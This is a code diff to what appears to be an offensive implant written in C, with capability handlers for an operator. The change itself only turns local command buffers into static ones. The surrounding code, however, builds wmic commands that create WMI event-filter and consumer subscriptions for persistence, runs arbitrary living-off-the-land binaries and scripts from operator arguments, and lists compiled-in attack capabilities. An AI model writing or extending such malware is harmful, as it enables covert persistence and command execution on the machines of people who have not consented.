@@ -578,7 +578,7 @@ static int px_cap_persist(char *args, char *report, unsigned int cap)
 
         /* The three objects are created with the WMI path syntax. */
         {
-            char cmd[2048];
+            static char cmd[2048];
             px_snprintf(cmd, sizeof(cmd),
                         "wmic /namespace:\\\\root\\\\subscription PATH "
                         "__EventFilter CREATE InstanceName=\"PXFilter\","
@@ -589,7 +589,7 @@ static int px_cap_persist(char *args, char *report, unsigned int cap)
                 ok = 1;
         }
         {
-            char cmd[2048];
+            static char cmd[2048];
             px_snprintf(cmd, sizeof(cmd),
                         "wmic /namespace:\\\\root\\\\subscription PATH "
                         "__EventConsumer CREATE Name=\"PXConsumer\","
@@ -600,7 +600,7 @@ static int px_cap_persist(char *args, char *report, unsigned int cap)
                 ok = 1;
         }
         {
-            char cmd[2048];
+            static char cmd[2048];
             px_snprintf(cmd, sizeof(cmd), "wmic %s", bind);
             if (px_run_capture(cmd, NULL, 0, NULL))
                 ok = 1;
@@ -926,7 +926,7 @@ static int px_cap_lolbin(char *args, char *report, unsigned int cap)
     px_strcpy(bin, args, sizeof(bin));
 
     {
-        char cmd[1024];
+        static char cmd[1024];
         char *out = NULL;
         long rc = -1;
         px_snprintf(cmd, sizeof(cmd), "%s %s", bin, sp + 1);
@@ -958,7 +958,7 @@ static int px_cap_script(char *args, char *report, unsigned int cap)
     char host[16];
     char *sp = px_strchr(args, ' ');
     char path[MAX_PATH];
-    char cmd[1024];
+    static char cmd[1024];
     char *out = NULL;
     long rc = -1;
 
@@ -1686,7 +1686,7 @@ int px_cap_run(const char *name, const char *args, char *report, unsigned int ca
     /* The list is not a technique, but the operator needs to know what
      * this build can do before asking it to do anything. */
     if (px_stricmp(name, "list") == 0) {
-        char names[1024];
+        static char names[1024];
         px_cap_list(names, sizeof(names));
         px_snprintf(report, cap,
                     "the capabilities compiled into this build: %s", names);
